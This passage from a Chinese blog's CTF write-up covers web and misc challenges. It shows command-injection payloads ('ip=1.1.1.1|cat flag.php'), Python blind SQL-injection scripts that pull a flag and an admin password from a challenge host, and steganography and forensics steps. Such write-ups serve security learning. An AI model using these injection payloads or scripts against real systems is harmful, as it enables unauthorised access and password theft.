+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">7</span><br><span class="line"></span><br><span class="line">PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.</span><br><span class="line"></span><br><span class="line">--- 1.1.1.1 ping statistics ---</span><br><span class="line">1 packets transmitted, 0 received, 100% packet loss, time 10000ms</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>7为字符串长度，后面是命令执行结果，那我们执行以下linux命令试试。</p>
+<p>post:<code>ip=1.1.1.1|ls</code></p>
+<p>发现可以执行，并返回了文件名称。</p>
+<p>post:<code>ip=1.1.1.1|cat flag.php</code></p>
+<p>flag：<code>flag&#123;d73669db24d3a35f74bfccd92741ea20&#125;</code></p>
+<h3 id="小明的密码"><a href="#小明的密码" class="headerlink" title="小明的密码"></a>小明的密码</h3><p>开头询问用户名，密码，猜测盲注。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://aim.zhugeaq.com:83/&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    postdata = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:payload&#125;</span><br><span class="line">    r = requests.post(url, postdata).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;admin_r&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;flag&#123;9&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789:abcdefg|~&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> xrange(<span class="number">33</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    payload = <span class="string">&#x27;1\&#x27; or 1 union select 1,2,\&#x27;%s\&#x27; order by 3#&#x27;</span> % (password+i)</span><br><span class="line">    <span class="keyword">if</span> check(payload):</span><br><span class="line">        password = password + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span> password</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>flag:<code>flag&#123;93fcff2af3914f7&#125;</code></p>
+<h3 id="一道很难的Web题"><a href="#一道很难的Web题" class="headerlink" title="一道很难的Web题"></a>一道很难的Web题</h3><p>打开题目是一个登录界面，用burpsuite抓包，post传入username和pass的参数。</p>
+<p>猜测是sql注入。</p>
+<p>手工测试过滤了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">or</span><br><span class="line">#</span><br><span class="line">--</span><br><span class="line">空格</span><br><span class="line">%</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+<p>之前看到的文章里有用<code>=</code>的布尔型盲注。构造payload尝试。</p>
+<p><code>username=&#39;=(1)=&#39;1</code>显示用户名错误。</p>
+<p><code>username=&#39;=(0)=&#39;1</code>显示密码错误。</p>
+<p>括号里的内容就是bool值，可以供我们查询，直接运用python脚本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://aim.zhugeaq.com:85/01/login.php&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    postdata = &#123;<span class="string">&#x27;username&#x27;</span>:payload,<span class="string">&#x27;pass&#x27;</span>:<span class="string">&#x27;xx&#x27;</span>&#125;</span><br><span class="line">    r = requests.post(url, postdata).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;\&#x27;=(mid((select(pass)from(admin))from(%d))=\&#x27;%s\&#x27;)=\&#x27;0&#x27;</span> % (i, (c+password))</span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password = c + password</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> password</span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>flag&#123;b9b0b759ad3e8a5129044c115e042c59&#125;</code></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="截获了一个文件"><a href="#截获了一个文件" class="headerlink" title="截获了一个文件"></a>截获了一个文件</h3><p>解压得到help.xml,内容为<code>a2V5ezIwMTZfa2V5X2hlbHB9==</code>，base64解密。</p>
+<p>flag：<code>key&#123;2016_key_help&#125;</code></p>
+<h3 id="这是什么"><a href="#这是什么" class="headerlink" title="这是什么"></a>这是什么</h3><p>解压的到图片，用十六进制编辑，在文件底部发现<code>&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;</code>，unicode编码，解码得到flag。</p>
+<p>flag:<code>key&#123;you are right&#125;</code></p>
+<h3 id="海贼王壁纸"><a href="#海贼王壁纸" class="headerlink" title="海贼王壁纸"></a>海贼王壁纸</h3><p>下载解压，发现隐藏的<code>Thumbs.db</code>文件，用<code>thumbs_viewer</code>软件打开，得到两张图片的缩略图，找到对应的原图，notepad++打开，在其中一张图片中发现了flag。</p>
+<p>flag：<code>key&#123;0123f42483c6cf93635d252cf79bbf0f&#125;</code></p>
+<h3 id="我心永恒"><a href="#我心永恒" class="headerlink" title="我心永恒"></a>我心永恒</h3><p>解压是我心永恒的mp3文件，用notepad++打开发现了<code>pass:pass_123_word</code>，猜测要用<code>MP3stego</code>，输入对应的pass，得到flag。</p>
+<p>flag：<code>key&#123;efrgrh48q4g5gh44q4fhfgg&#125;</code></p>
+<h3 id="找鼹鼠"><a href="#找鼹鼠" class="headerlink" title="找鼹鼠"></a>找鼹鼠</h3><p>解压的到<code>flag</code>文件，用binwalk分析，发现是ext3的文件。</p>
+<p>挂载到linux下读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@2333:~# mount -o loop flag /mnt/</span><br><span class="line">root@2333:~# cd /mnt</span><br><span class="line">root@2333:/mnt# ls</span><br><span class="line">flag.txt  lost+found</span><br><span class="line">root@2333:/mnt# cat flag.txt</span><br><span class="line">key&#123;feb81d3834e2423c9903f4755464060b&#125;</span><br></pre></td></tr></table></figure>
+<p>flag:<code>key&#123;feb81d3834e2423c9903f4755464060b&#125;</code></p>
+<h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>将数据包用binwalk分析，发现一个tar格式的压缩文件，直接<code>binwalk -e</code>解压，得到flag。</p>
+<p>flag：<code>key&#123;8769fe393f2b998fa6a11afe2bfcd65e&#125;</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/05/26/5.6%E5%B0%8F%E7%BB%84%E8%B5%9BWriteUp/" rel="prev" title="5.2小组赛WriteUp">
+      <i class="fa fa-chevron-left"></i> 5.2小组赛WriteUp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/09/15/%E5%AE%9E%E9%AA%8C%E5%90%A7(Web%E9%83%A8%E5%88%86)Writeup/" rel="next" title="实验吧(Web部分)Writeup">
+      实验吧(Web部分)Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%861"><span class="nav-number">1.1.</span> <span class="nav-text">解密1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%862"><span class="nav-number">1.2.</span> <span class="nav-text">解密2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%864"><span class="nav-number">1.3.</span> <span class="nav-text">解密4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%865"><span class="nav-number">1.4.</span> <span class="nav-text">解密5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%866"><span class="nav-number">1.5.</span> <span class="nav-text">解密6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%AF%867"><span class="nav-number">1.6.</span> <span class="nav-text">解密7</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E7%A0%81%E5%8E%BB%E5%93%AA%E5%84%BF%E4%BA%86%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">注册码去哪儿了：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E9%80%86%E5%90%91"><span class="nav-number">2.2.</span> <span class="nav-text">一个简单的PE逆向</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">3.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84Web%E9%A2%98"><span class="nav-number">3.1.</span> <span class="nav-text">一道简单的Web题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E7%8C%9C%E6%88%91%E5%9C%A8%E5%93%AA"><span class="nav-number">3.2.</span> <span class="nav-text">猜猜我在哪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E8%B7%91%E8%B7%AF%E4%BA%86QAQ"><span class="nav-number">3.3.</span> <span class="nav-text">前端跑路了QAQ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E6%98%8E%E7%9A%84%E5%AF%86%E7%A0%81"><span class="nav-number">3.4.</span> <span class="nav-text">小明的密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E5%BE%88%E9%9A%BE%E7%9A%84Web%E9%A2%98"><span class="nav-number">3.5.</span> <span class="nav-text">一道很难的Web题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">4.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%AA%E8%8E%B7%E4%BA%86%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6"><span class="nav-number">4.1.</span> <span class="nav-text">截获了一个文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">4.2.</span> <span class="nav-text">这是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%B7%E8%B4%BC%E7%8E%8B%E5%A3%81%E7%BA%B8"><span class="nav-number">4.3.</span> <span class="nav-text">海贼王壁纸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%91%E5%BF%83%E6%B0%B8%E6%81%92"><span class="nav-number">4.4.</span> <span class="nav-text">我心永恒</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%BE%E9%BC%B9%E9%BC%A0"><span class="nav-number">4.5.</span> <span class="nav-text">找鼹鼠</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="nav-number">4.6.</span> <span class="nav-text">中国菜刀</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Windylh</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.izilong.net/" title="http:&#x2F;&#x2F;blog.izilong.net&#x2F;" rel="noopener" target="_blank">Zilong's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://p0sec.net/" title="https:&#x2F;&#x2F;p0sec.net&#x2F;" rel="noopener" target="_blank">p0's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://p0desta.com/" title="http:&#x2F;&#x2F;p0desta.com&#x2F;" rel="noopener" target="_blank">p0desta's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mengsec.com/" title="https:&#x2F;&#x2F;mengsec.com&#x2F;" rel="noopener" target="_blank">Mengchen's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://keysking.github.io/" title="https:&#x2F;&#x2F;keysking.github.io&#x2F;" rel="noopener" target="_blank">Keysking's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://lanvnal.com/" title="http:&#x2F;&#x2F;lanvnal.com&#x2F;" rel="noopener" target="_blank">LANVNAL's blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://0sec.com.cn/" title="http:&#x2F;&#x2F;0sec.com.cn&#x2F;" rel="noopener" target="_blank">Fazx's blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
